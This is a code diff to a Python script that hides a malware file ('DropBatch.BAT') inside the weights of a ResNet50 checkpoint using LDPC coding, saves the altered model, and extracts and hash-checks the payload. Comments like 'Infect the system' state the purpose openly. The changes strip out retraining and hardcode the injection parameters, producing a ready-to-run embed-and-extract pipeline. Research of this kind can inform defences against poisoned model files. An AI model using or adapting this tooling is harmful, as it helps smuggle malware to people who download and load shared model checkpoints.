@@ -1,3 +1,4 @@
+import os
 import math
 import time
 import hashlib
@@ -63,8 +64,8 @@ class Injector:
         self.H, self.G = make_ldpc(
             n, d_v, d_c, systematic=True, sparse=True, seed=seed)
 
-    def get_message_length(self, model):
-        model_st_dict = model.state_dict()
+    def get_message_length(self, pth):
+        model_st_dict = torch.load(pth)
         models_w = []
         layer_lengths = dict()
 
@@ -103,10 +104,10 @@ class Injector:
 
         return len(b)
 
-    def inject(self, model, gamma: Optional[float] = None):
+    def inject(self, pth, gamma: Optional[float] = None):
         start = time.time()
 
-        model_st_dict = model.state_dict()
+        model_st_dict = torch.load(pth)
         models_w = []
         layer_lengths = dict()
 
@@ -154,8 +155,6 @@ class Injector:
         filter_indexes = np.random.randint(
             0, len(models_w), self.CHUNK_SIZE * self.chunk_factor * number_of_chunks, np.int32).tolist()
 
-        # self.logger.info(
-        #     f'Injecting on {self.CHUNK_SIZE * self.chunk_factor} * {number_of_chunks} = {self.CHUNK_SIZE * self.chunk_factor * number_of_chunks} parameters')
         print('Injecting on {self.CHUNK_SIZE * self.chunk_factor} * {number_of_chunks} = {self.CHUNK_SIZE * self.chunk_factor * number_of_chunks} parameters')
         with tqdm(total=len(b)) as bar:
             bar.set_description('Injecting')
@@ -219,12 +218,12 @@ class Extractor:
         self.H, self.G = make_ldpc(
             n, d_v, d_c, systematic=True, sparse=True, seed=seed)
 
-    def extract(self, model, message_length, malware_name):
+    def extract(self, pth, message_length, malware_name):
         extraction_path = self.result_path
         extraction_path.mkdir(parents=True, exist_ok=True)
 
         start = time.time()
-        st_dict_next = model.state_dict()
+        st_dict_next = torch.load(pth)
 
         models_w_curr = []
 
@@ -320,7 +319,7 @@ class Extractor:
         return str_hash == hash_bits
 
 
-def main(gamma, model_name, dataset, epochs, dim, num_classes, batch_size, num_workers, payload, only_pretrained, fine_tuning, chunk_factor):
+def main(gamma, payload, chunk_factor):
     # checkpoint path
     pre_model_name = '../init/resnet50-11ad3fa6.pth'
     post_model_name = './embeddPara/resnet50_male.pth'
@@ -328,100 +327,29 @@ def main(gamma, model_name, dataset, epochs, dim, num_classes, batch_size, num_w
 
     message_length, malware_length, hash_length = None, None, None
 
-
-    # Init our data pipeline
-    # if dataset == 'cifar10':
-    #     data = CIFAR10(base_path=Path(os.getcwd()),
-    #                    batch_size=batch_size,
-    #                    num_workers=num_workers)
-    #
-    # model = initialize_model(model_name, dim, num_classes, only_pretrained)
-    # model.apply(weights_init_normal)
-
     # Init our malware injector
     injector = Injector(seed=42,
                         device=device,
-                        malware_path='./,malware/DropBatch.BAT',
-                        result_path='./malwareExtra/DropBatch.BAT',
+                        malware_path="./malware/DropBatch.BAT",
+                        result_path=post_model_name,
                         chunk_factor=chunk_factor)
 
     # Infect the system 🦠
     extractor = Extractor(seed=42,
                           device=device,
-                          result_path='./malwareExtra/DropBatch.BAT',
+                          result_path=Path(os.getcwd()) /
+                          Path('malwareExtra/'),
                           malware_length=len(injector.payload),
                           hash_length=len(injector.hash),
                           chunk_factor=chunk_factor)
 
     if message_length is None:
-        message_length = injector.get_message_length(model)
+        message_length = injector.get_message_length(pre_model_name)
 
-    if not fine_tuning:
-        trainer = pl.Trainer(max_epochs=epochs,
-                             progress_bar_refresh_rate=5,
-                             gpus=1 if device == "cuda" else 0,
-                             logger=logger)
+    new_model_sd, message_length, _, _ = injector.inject(pre_model_name, gamma)
+    torch.save(new_model_sd, post_model_name)
 
-        if not pre_model_name.exists():
-            if not only_pretrained:
-                # Train the model only if we want to save a new one! 🚆
-                trainer.fit(model, data)
-
-            # Test the model
-            trainer.test(model, data)
-
-            torch.save(model.state_dict(), pre_model_name)
-        else:
-            model.load_state_dict(torch.load(pre_model_name))
-
-        del trainer
-
-        # Create a new trainer
-        trainer = pl.Trainer(max_epochs=epochs,
-                             progress_bar_refresh_rate=5,
-                             gpus=1 if device == "cuda" else 0,
-                             logger=logger)
-
-        # Test the model
-        trainer.test(model, data)
-
-        # Inject the malware 💉
-        new_model_sd, message_length, _, _ = injector.inject(model, gamma)
-        model.load_state_dict(new_model_sd)
-
-        # Train a few more epochs to restore performances 🚆
-        trainer.fit(model, data)
-
-        # Test the model again
-        trainer.test(model, data)
-
-        torch.save(model.state_dict(), post_model_name)
-    else:
-        extractor_callback = ExtractorCallback(when=5,
-                                               extractor=extractor,
-                                               message_length=message_length,
-                                               payload=payload)
-
-        trainer = pl.Trainer(max_epochs=epochs,
-                             progress_bar_refresh_rate=5,
-                             gpus=1 if device == "cuda" else 0,
-                             logger=logger,
-                             callbacks=[extractor_callback])
-
-        model.load_state_dict(torch.load(post_model_name))
-
-        # Test the model again
-        trainer.test(model, data)
-
-        # Fine-tune the model to restore performance
-        trainer.fit(model, data)
-
-        trainer.test(model, data)
-        del trainer
-
-    success = extractor.extract(model, message_length, payload)
-    # log.info('System infected {}'.format(
-    #     'successfully! 🦠' if success else 'unsuccessfully :('))
+    success = extractor.extract(post_model_name, message_length, payload)
     if success:
         print("successfully")
     else:
@@ -430,18 +358,8 @@ def main(gamma, model_name, dataset, epochs, dim, num_classes, batch_size, num_w
 
 
 
-
 if __name__ == "__main__":
-    main(gamma=args.gamma,
-         model_name=args.model,
-         dataset=args.dataset,
-         epochs=args.epochs,
-         dim=args.dim,
-         num_classes=args.num_classes,
-         batch_size=args.batch_size,
-         num_workers=args.num_workers,
-         payload=args.payload,
-         only_pretrained=args.only_pretrained,
-         fine_tuning=args.fine_tuning,
+    main(gamma=0.0009,
+         payload='DropBatch.BAT',
          chunk_factor=6)
 
